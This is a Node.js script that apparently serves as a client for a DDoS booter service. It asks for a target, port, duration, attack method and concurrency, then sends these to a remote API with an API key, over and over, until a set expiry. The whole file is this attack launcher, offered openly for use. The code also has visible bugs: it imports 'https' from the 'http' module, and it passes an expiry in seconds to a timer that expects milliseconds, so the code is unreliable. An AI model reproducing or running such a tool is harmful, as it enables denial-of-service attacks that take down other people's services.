import readline from 'readline';
import http from 'http';
import https from 'http';

let successCount = 0;
const paramterkey = "apikey=ABC";
const api_url = "https://example.com/api";

function sendApi(params) {
    const url = `${api_url}?${paramterkey}&target=${params.target}&port=${params.port}&time=${params.time}&method=${params.method}`;
    const client = api_url.startsWith('https') ? https : http;

    client.get(url, (res) => {
        let data = '';
        res.on('data', (chunk) => {
            data += chunk;
        });
        res.on('end', () => {
            if (res.statusCode === 200) {
                successCount++;
                console.log(`[${successCount}x] Success Send ${params.target} | ${params.port} | ${params.time} | ${params.method}`);
            } else {
                console.log(`Failed with status code: ${res.statusCode}`);
            }
        });
    }).on('error', (err) => {
        console.error('Error sending API request:', err.message);
    });
}

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function parseTimeInput(input) {
    try {
        let value = parseInt(input.slice(0, -1));
        let unit = input.slice(-1);

        switch (unit) {
            case 'w':
                value *= 7 * 24 * 60 * 60;
                break;
            case 'd':
                value *= 24 * 60 * 60;
                break;
            case 'j':
            case 'h':
                value *= 60 * 60;
                break;
            case 'm':
                value *= 60;
                break;
            case 's':
                break;
            default:
                throw new Error('Invalid time unit');
        }

        if (isNaN(value) || value <= 0) throw new Error('Invalid time value');
        return value;
    } catch (err) {
        console.error('Error parsing time input:', err.message);
        rl.close();
        process.exit(1);
    }
}

function validateInput(input, type) {
    if (type === 'number') {
        const number = parseInt(input);
        return !isNaN(number) && number > 0;
    }
    return input && input.trim() !== '';
}

console.log(`
███╗   ███╗███████╗ ██████╗     ██╗███████╗
████╗ ████║██╔════╝██╔════╝     ██║██╔════╝
██╔████╔██║███████╗██║          ██║███████╗
██║╚██╔╝██║╚════██║██║     ██   ██║╚════██║
██║ ╚═╝ ██║███████║╚██████╗╚█████╔╝███████║
╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚════╝ ╚══════
`);
console.log("Credit: @mscjs channel: @jo1el");

function askQuestion(query, type, callback) {
    rl.question(query, (answer) => {
        if (validateInput(answer, type)) {
            callback(answer);
        } else {
            console.log(`Invalid input for ${query.trim()}`);
            askQuestion(query, type, callback);
        }
    });
}

askQuestion('Target: ', 'text', (target) => {
    askQuestion('Port: ', 'number', (port) => {
        askQuestion('Time (Seconds): ', 'number', (timeInterval) => {
            askQuestion('Method: ', 'text', (method) => {
                askQuestion('Concurrent: ', 'number', (concurrent) => {
                    askQuestion('Expired (e.g. 1h, 1d): ', 'text', (expired) => {
                        const params = { target, port, time: timeInterval, method: method };
                        const expiredTime = parseTimeInput(expired);

                        if (expiredTime <= 0) {
                            console.log('Expired time must be greater than zero.');
                            rl.close();
                            return;
                        }

                        try {
                            const startSendingRequests = () => {
                                for (let i = 0; i < concurrent; i++) {
                                    sendApi(params);
                                }
                            };

                            const interval = setInterval(startSendingRequests, timeInterval * 1000);

                            setTimeout(() => {
                                clearInterval(interval);
                                rl.close();
                                console.log('Expired: Stopping the requests.');
                            }, expiredTime);
                        } catch (err) {
                            console.error('Error during interval or timeout:', err.message);
                            rl.close();
                        }
                    });
                });
            });
        });
    });
});